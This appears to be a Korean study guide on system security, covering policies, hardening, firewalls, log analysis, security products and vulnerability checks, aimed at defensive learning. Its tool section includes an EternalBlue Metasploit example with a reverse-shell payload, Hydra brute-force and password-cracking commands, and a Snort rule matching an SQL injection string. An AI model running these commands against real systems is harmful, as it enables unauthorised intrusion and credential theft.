# 시스템 보안 대응

시스템 보안위협에 대한 예방과 대응은 관리적, 기술적 보안 대책을 통해 이루어집니다. 보안 분석 도구와 솔루션을 활용하여 위협을 탐지하고 대응합니다.

---

## 관리적 보안 대책

### 보안 정책 수립

| 정책 | 설명 |
|------|------|
| 정보보안 정책 | 조직의 정보보안 원칙과 방향 |
| 접근 통제 정책 | 시스템 및 데이터 접근 규칙 |
| 패스워드 정책 | 패스워드 복잡도, 변경 주기 |
| 사용 정책 (AUP) | 허용되는 시스템 사용 범위 |
| 백업 정책 | 백업 주기, 보관 기간, 복구 절차 |
| 사고 대응 정책 | 보안 사고 대응 절차 |

### 보안 설정 강화

#### 계정 관리

| 항목 | 권장 설정 |
|------|----------|
| 기본 계정 | 비활성화 또는 이름 변경 |
| 불필요한 계정 | 삭제 |
| 패스워드 복잡도 | 8자 이상, 대소문자/숫자/특수문자 |
| 패스워드 만료 | 90일 (또는 조직 정책) |
| 계정 잠금 | 5회 실패 시 30분 잠금 |
| 세션 타임아웃 | 유휴 시간 후 자동 잠금 |

#### 서비스 관리

| 항목 | 권장 설정 |
|------|----------|
| 불필요한 서비스 | 비활성화 (Telnet, FTP 등) |
| 서비스 권한 | 최소 권한 계정으로 실행 |
| 원격 접근 | SSH만 허용, 특정 IP 제한 |
| 관리 포트 | 기본 포트 변경, 접근 제한 |

### 인증 강화

| 방법 | 설명 |
|------|------|
| 다중 인증 (MFA) | 패스워드 + OTP/생체인증 |
| 공개키 인증 | SSH 키 기반 인증 |
| 인증서 기반 | PKI 인증서 사용 |
| SSO | 중앙 집중식 인증 |
| 권한 있는 접근 관리 (PAM) | 특권 계정 접근 제어 |

### 패치 관리

#### 패치 관리 프로세스

| 단계 | 설명 |
|------|------|
| 1. 모니터링 | 새로운 취약점/패치 정보 수집 |
| 2. 평가 | 적용 대상, 영향도 분석 |
| 3. 테스트 | 테스트 환경에서 검증 |
| 4. 배포 | 운영 환경 적용 |
| 5. 검증 | 적용 결과 확인 |
| 6. 문서화 | 패치 이력 기록 |

#### 패치 관리 도구

| 도구 | 설명 |
|------|------|
| WSUS | Windows Server Update Services |
| SCCM/MECM | Microsoft Endpoint Configuration Manager |
| Ansible | 자동화 도구 |
| Puppet/Chef | 구성 관리 도구 |
| yum/apt | Linux 패키지 관리자 |

### 클라우드 보안

#### 클라우드 보안 프레임워크

| 프레임워크 | 설명 |
|-----------|------|
| CSA CCM | Cloud Security Alliance Cloud Controls Matrix |
| NIST CSF | Cybersecurity Framework |
| ISO 27017 | 클라우드 서비스 보안 |
| ISO 27018 | 클라우드 개인정보 보호 |

#### 클라우드 보안 설정

| 항목 | 권장 설정 |
|------|----------|
| IAM | 최소 권한, MFA 필수 |
| 네트워크 | VPC, 보안 그룹, 네트워크 ACL |
| 스토리지 | 암호화, 접근 로그 활성화 |
| 로깅 | CloudTrail, CloudWatch 활성화 |
| 키 관리 | KMS 사용, 키 순환 |
| 설정 감사 | Config, Security Hub 활용 |

---

## 기술적 보안 대책

### 접근 통제

#### 접근 통제 모델

| 모델 | 설명 |
|------|------|
| DAC (Discretionary) | 소유자가 권한 결정 (UNIX 권한) |
| MAC (Mandatory) | 시스템이 권한 결정 (SELinux) |
| RBAC (Role-Based) | 역할 기반 권한 부여 |
| ABAC (Attribute-Based) | 속성 기반 권한 결정 |

#### 접근 통제 구현

| 레벨 | 방법 |
|------|------|
| 네트워크 | 방화벽, VLAN, ACL |
| 호스트 | 호스트 방화벽, TCP Wrapper |
| 애플리케이션 | 인증/인가, 세션 관리 |
| 데이터 | 암호화, 마스킹, DLP |

### 파일 무결성 모니터링 (FIM)

#### FIM 도구

| 도구 | 설명 |
|------|------|
| AIDE | Advanced Intrusion Detection Environment |
| Tripwire | 상용/오픈소스 FIM |
| OSSEC | 호스트 기반 IDS, FIM 포함 |
| Samhain | 파일 무결성 검사 |

#### 모니터링 대상

| 대상 | 예시 |
|------|------|
| 시스템 파일 | /etc/passwd, /etc/shadow |
| 설정 파일 | httpd.conf, sshd_config |
| 실행 파일 | /bin, /sbin, /usr/bin |
| 커널 모듈 | /lib/modules |
| 시작 스크립트 | /etc/init.d, systemd units |

### 데이터 유출 방지

#### DLP (Data Loss Prevention)

| 유형 | 설명 |
|------|------|
| Endpoint DLP | USB, 프린터, 클립보드 제어 |
| Network DLP | 이메일, 웹 트래픽 모니터링 |
| Storage DLP | 파일 서버, DB 콘텐츠 검사 |
| Cloud DLP | 클라우드 서비스 데이터 보호 |

#### DLP 탐지 방법

| 방법 | 설명 |
|------|------|
| 정규표현식 | 패턴 매칭 (주민번호, 카드번호) |
| 키워드 | 특정 단어 탐지 |
| 핑거프린트 | 문서 지문 생성 후 유사도 비교 |
| 머신러닝 | 데이터 분류 모델 |

### 접근 제어 (Network)

#### 방화벽 설정

**iptables 보안 설정**

```bash
# 기본 정책 설정
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# 루프백 허용
iptables -A INPUT -i lo -j ACCEPT

# 확립된 연결 허용
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH 허용 (특정 IP)
iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT

# ICMP 제한
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
```

**Windows 방화벽 설정**
- 인바운드 규칙: 필요한 포트만 허용
- 아웃바운드 규칙: 필요 시 제한
- 프로필별 설정: 도메인, 개인, 공용

### 로그 분석 및 이벤트 모니터링

#### 로그 분석 절차

| 단계 | 설명 |
|------|------|
| 수집 | 다양한 소스에서 로그 수집 |
| 정규화 | 표준 형식으로 변환 |
| 저장 | 중앙 저장소에 보관 |
| 분석 | 패턴 분석, 상관관계 분석 |
| 알림 | 이상 징후 탐지 시 알림 |
| 대응 | 사고 대응 절차 수행 |

#### 주요 분석 항목

| 항목 | 지표 |
|------|------|
| 인증 실패 | 반복적 로그인 실패 |
| 권한 변경 | 계정/그룹 권한 변경 |
| 비정상 접근 | 근무 외 시간, 비인가 IP |
| 대량 데이터 접근 | 비정상적 대량 조회/다운로드 |
| 시스템 변경 | 설정 파일, 서비스 변경 |
| 악성코드 지표 | 알려진 IOC 매칭 |

---

## 시스템 분석 도구

### 포트 스캐너

#### Nmap

| 옵션 | 설명 |
|------|------|
| -sS | SYN 스캔 (스텔스) |
| -sT | TCP Connect 스캔 |
| -sU | UDP 스캔 |
| -sV | 서비스 버전 탐지 |
| -O | OS 탐지 |
| -A | 종합 스캔 (OS, 버전, 스크립트) |
| -p | 포트 지정 (-p 22,80,443 / -p-) |
| -Pn | 호스트 발견 생략 |
| --script | NSE 스크립트 실행 |

**Nmap 사용 예시**

```bash
# 기본 스캔
nmap 192.168.1.1

# 전체 포트 스캔
nmap -p- 192.168.1.1

# 서비스 버전 탐지
nmap -sV 192.168.1.1

# 취약점 스캔
nmap --script vuln 192.168.1.1

# 스텔스 스캔
nmap -sS -T2 192.168.1.1
```

### 취약점 스캐너

#### 네트워크 취약점 스캐너

| 도구 | 유형 | 설명 |
|------|------|------|
| Nessus | 상용 | 광범위한 취약점, 컴플라이언스 |
| OpenVAS | 오픈소스 | Nessus 포크 |
| Qualys | 상용/SaaS | 클라우드 기반 |
| Nexpose | 상용 | Rapid7 제품 |

#### 웹 취약점 스캐너

| 도구 | 유형 | 설명 |
|------|------|------|
| OWASP ZAP | 오픈소스 | 웹 앱 취약점 스캐너 |
| Burp Suite | 상용/무료 | 웹 프록시, 스캐너 |
| Nikto | 오픈소스 | 웹 서버 스캐너 |
| Acunetix | 상용 | 웹 앱 스캐너 |
| SQLmap | 오픈소스 | SQL Injection 자동화 |

### Kali Linux

침투 테스트 및 보안 감사를 위한 리눅스 배포판입니다.

#### 주요 도구 카테고리

| 카테고리 | 도구 예시 |
|---------|----------|
| 정보 수집 | Nmap, Maltego, Recon-ng |
| 취약점 분석 | OpenVAS, Nikto |
| 웹 애플리케이션 | Burp Suite, ZAP, SQLmap |
| 패스워드 공격 | John the Ripper, Hashcat, Hydra |
| 무선 공격 | Aircrack-ng, Kismet |
| 익스플로잇 | Metasploit, Searchsploit |
| 포렌식 | Autopsy, Volatility |
| 리버싱 | Ghidra, Radare2 |
| 스니핑/스푸핑 | Wireshark, Ettercap |
| 포스트 익스플로잇 | Empire, PowerSploit |

#### 주요 도구 상세

**Metasploit**

| 구성요소 | 설명 |
|---------|------|
| msfconsole | 메인 인터페이스 |
| Exploits | 취약점 공격 모듈 |
| Payloads | 공격 후 실행 코드 |
| Auxiliary | 스캐닝, 퍼징 등 보조 모듈 |
| Post | 포스트 익스플로잇 모듈 |
| Encoders | 페이로드 인코딩 |
| Meterpreter | 고급 페이로드 셸 |

```bash
# Metasploit 사용 예시
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

**John the Ripper**

```bash
# 패스워드 크래킹
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 해시 형식 지정
john --format=NT hash.txt
```

**Hashcat**

```bash
# GPU 가속 크래킹
hashcat -m 1000 -a 0 hash.txt wordlist.txt

# 룰 기반 공격
hashcat -m 1000 -a 0 -r rules/best64.rule hash.txt wordlist.txt
```

**Hydra**

```bash
# SSH 무차별 대입
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# HTTP 폼 로그인
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
```

### 패킷 분석

#### Wireshark

| 기능 | 설명 |
|------|------|
| 캡처 | 네트워크 패킷 실시간 캡처 |
| 필터 | 디스플레이/캡처 필터 |
| 분석 | 프로토콜 분석, 통계 |
| 재구성 | TCP 스트림, 파일 추출 |

**Wireshark 필터 예시**

| 필터 | 설명 |
|------|------|
| ip.addr == 192.168.1.1 | 특정 IP |
| tcp.port == 80 | 특정 포트 |
| http | HTTP 프로토콜 |
| tcp.flags.syn == 1 | SYN 패킷 |
| dns | DNS 쿼리 |
| tcp contains "password" | 내용 검색 |

#### tcpdump

```bash
# 인터페이스에서 캡처
tcpdump -i eth0

# 특정 호스트
tcpdump host 192.168.1.1

# 특정 포트
tcpdump port 80

# 파일 저장
tcpdump -w capture.pcap

# 파일 읽기
tcpdump -r capture.pcap
```

### 포렌식 도구

#### 디스크 포렌식

| 도구 | 설명 |
|------|------|
| Autopsy | GUI 기반 포렌식 플랫폼 |
| Sleuth Kit | CLI 포렌식 도구 |
| FTK | Forensic Toolkit (상용) |
| EnCase | 상용 포렌식 솔루션 |
| dd/dc3dd | 디스크 이미지 생성 |

#### 메모리 포렌식

| 도구 | 설명 |
|------|------|
| Volatility | 메모리 분석 프레임워크 |
| Rekall | 메모리 분석 도구 |
| LiME | Linux 메모리 덤프 |
| WinPmem | Windows 메모리 덤프 |

**Volatility 사용 예시**

```bash
# 프로파일 확인
volatility -f memory.dmp imageinfo

# 프로세스 목록
volatility -f memory.dmp --profile=Win10x64 pslist

# 네트워크 연결
volatility -f memory.dmp --profile=Win10x64 netscan

# 레지스트리 하이브
volatility -f memory.dmp --profile=Win10x64 hivelist

# 악성코드 탐지
volatility -f memory.dmp --profile=Win10x64 malfind
```

---

## 시스템 보안 솔루션

### 호스트 기반 보안

#### 안티바이러스/안티멀웨어

| 솔루션 | 유형 |
|--------|------|
| Windows Defender | Windows 기본 제공 |
| ClamAV | 오픈소스 |
| Symantec/Norton | 상용 |
| McAfee | 상용 |
| Kaspersky | 상용 |
| ESET | 상용 |

#### EDR (Endpoint Detection and Response)

| 기능 | 설명 |
|------|------|
| 실시간 모니터링 | 엔드포인트 활동 모니터링 |
| 행위 분석 | 악성 행위 패턴 탐지 |
| 위협 인텔리전스 | IOC 기반 탐지 |
| 사고 대응 | 격리, 복구 기능 |
| 포렌식 | 상세 조사 기능 |

**주요 EDR 솔루션**
- CrowdStrike Falcon
- Carbon Black
- Microsoft Defender for Endpoint
- SentinelOne
- Cybereason

#### HIDS (Host-based IDS)

| 솔루션 | 설명 |
|--------|------|
| OSSEC | 오픈소스, 로그 분석, FIM |
| Wazuh | OSSEC 포크, SIEM 통합 |
| Samhain | 파일 무결성 중심 |
| AIDE | 파일 무결성 검사 |

### 네트워크 기반 보안

#### 방화벽

| 유형 | 설명 |
|------|------|
| 패킷 필터링 | IP, 포트 기반 필터링 |
| 상태 기반 검사 | 연결 상태 추적 |
| 애플리케이션 방화벽 | L7 프로토콜 검사 |
| 차세대 방화벽 (NGFW) | DPI, IPS, 애플리케이션 인식 |

#### IDS/IPS

| 유형 | 특징 |
|------|------|
| NIDS | 네트워크 트래픽 모니터링 |
| HIDS | 호스트 로그/파일 모니터링 |
| IPS | 탐지 + 차단 |

**탐지 방식**

| 방식 | 설명 |
|------|------|
| 시그니처 기반 | 알려진 공격 패턴 매칭 |
| 이상 탐지 | 정상 행위 벗어난 활동 탐지 |
| 정책 기반 | 정의된 정책 위반 탐지 |
| 하이브리드 | 복합 방식 |

**Snort 규칙 예시**

```
alert tcp any any -> any 80 (msg:"SQL Injection Attempt";
  content:"' OR '1'='1"; nocase; sid:1000001;)
```

| 구성요소 | 설명 |
|---------|------|
| Action | alert, log, pass, drop |
| Protocol | tcp, udp, icmp, ip |
| Source/Dest | IP, 포트 |
| Direction | `->`, `<>`, `<-` |
| Options | msg, content, sid 등 |

#### WAF (Web Application Firewall)

| 기능 | 설명 |
|------|------|
| SQL Injection 차단 | SQL 공격 패턴 탐지/차단 |
| XSS 차단 | 스크립트 공격 차단 |
| 요청 검증 | HTTP 요청 검증 |
| 봇 탐지 | 악성 봇 차단 |
| DDoS 완화 | 요청 제한, CAPTCHA |

**주요 WAF 솔루션**
- ModSecurity (오픈소스)
- AWS WAF
- Cloudflare WAF
- Imperva WAF
- F5 Advanced WAF

#### NAC (Network Access Control)

| 기능 | 설명 |
|------|------|
| 인증 | 802.1X, MAC 인증 |
| 상태 점검 | 패치, AV 상태 확인 |
| 격리 | 미준수 기기 격리 |
| 게스트 관리 | 게스트 네트워크 분리 |

### 통합 보안 관리

#### SIEM (Security Information and Event Management)

| 기능 | 설명 |
|------|------|
| 로그 수집 | 다양한 소스 로그 통합 |
| 정규화 | 표준 형식 변환 |
| 상관분석 | 이벤트 간 연관 분석 |
| 알림 | 위협 탐지 시 알림 |
| 대시보드 | 시각화, 리포팅 |
| 컴플라이언스 | 규정 준수 보고 |

**주요 SIEM 솔루션**
- Splunk
- IBM QRadar
- Microsoft Sentinel
- Elastic Security (ELK)
- ArcSight
- LogRhythm

#### SOAR (Security Orchestration, Automation and Response)

| 기능 | 설명 |
|------|------|
| 오케스트레이션 | 보안 도구 통합 |
| 자동화 | 반복 작업 자동화 |
| 대응 | 플레이북 기반 대응 |
| 케이스 관리 | 사고 추적 관리 |

#### XDR (Extended Detection and Response)

EDR을 확장하여 네트워크, 클라우드, 이메일 등을 통합합니다.

| 영역 | 범위 |
|------|------|
| Endpoint | 엔드포인트 탐지 |
| Network | 네트워크 트래픽 |
| Cloud | 클라우드 워크로드 |
| Email | 이메일 보안 |
| Identity | 계정/인증 |

### 백업 및 복구

#### 백업 유형

| 유형 | 설명 | 복구 시간 |
|------|------|----------|
| 전체 백업 | 모든 데이터 백업 | 빠름 |
| 증분 백업 | 마지막 백업 이후 변경분 | 느림 |
| 차등 백업 | 마지막 전체 백업 이후 변경분 | 중간 |
| 스냅샷 | 특정 시점 이미지 | 매우 빠름 |

#### 3-2-1 백업 규칙

- **3**: 데이터 사본 3개 유지
- **2**: 2개의 다른 미디어 유형
- **1**: 1개는 오프사이트 보관

#### 재해 복구 지표

| 지표 | 설명 |
|------|------|
| RPO (Recovery Point Objective) | 허용 가능한 데이터 손실 시점 |
| RTO (Recovery Time Objective) | 목표 복구 시간 |
| MTTR (Mean Time To Recover) | 평균 복구 시간 |
| MTBF (Mean Time Between Failures) | 평균 고장 간격 |

---

## 취약점 점검

### 취약점 점검 절차

| 단계 | 설명 |
|------|------|
| 1. 범위 정의 | 점검 대상 시스템 정의 |
| 2. 정보 수집 | 시스템 정보 수집 |
| 3. 스캔 | 자동화 도구로 취약점 스캔 |
| 4. 분석 | 결과 분석, 오탐 제거 |
| 5. 보고서 | 취약점 보고서 작성 |
| 6. 조치 | 취약점 조치 및 확인 |

### 주요 점검 항목

#### 계정 관리

| 항목 | 점검 내용 |
|------|----------|
| 기본 계정 | 비활성화 여부 |
| 불필요한 계정 | 미사용 계정 존재 |
| 패스워드 정책 | 복잡도, 만료 기간 |
| 권한 | 최소 권한 원칙 준수 |
| 공유 계정 | 공유 계정 사용 여부 |

#### 서비스 관리

| 항목 | 점검 내용 |
|------|----------|
| 불필요한 서비스 | 미사용 서비스 구동 |
| 서비스 권한 | 적절한 권한으로 실행 |
| 취약 서비스 | Telnet, FTP 등 사용 |
| 원격 접근 | SSH 설정, 접근 제한 |

#### 패치 관리

| 항목 | 점검 내용 |
|------|----------|
| OS 패치 | 최신 패치 적용 |
| 애플리케이션 패치 | 취약한 버전 사용 |
| 자동 업데이트 | 업데이트 정책 설정 |

#### 로그 관리

| 항목 | 점검 내용 |
|------|----------|
| 감사 정책 | 감사 로그 활성화 |
| 로그 보관 | 보관 기간 적절성 |
| 로그 접근 | 로그 파일 권한 |

### KISA 주요정보통신기반시설 취약점 점검 가이드

| 항목 | 분류 |
|------|------|
| U-01 ~ U-72 | Unix/Linux 서버 |
| W-01 ~ W-81 | Windows 서버 |
| N-01 ~ N-41 | 네트워크 장비 |
| S-01 ~ S-24 | 보안 장비 |
| D-01 ~ D-24 | 데이터베이스 |
| E-01 ~ E-19 | 웹 서버 |
| C-01 ~ C-31 | PC |

---

## 핵심 키워드

`관리적 보안` `기술적 보안` `패치 관리` `접근 통제` `DAC` `MAC` `RBAC` `FIM` `DLP` `Nmap` `Nessus` `OpenVAS` `Kali Linux` `Metasploit` `Wireshark` `Volatility` `EDR` `HIDS` `방화벽` `IDS` `IPS` `Snort` `WAF` `NAC` `SIEM` `SOAR` `XDR` `백업` `RPO` `RTO` `취약점 점검`
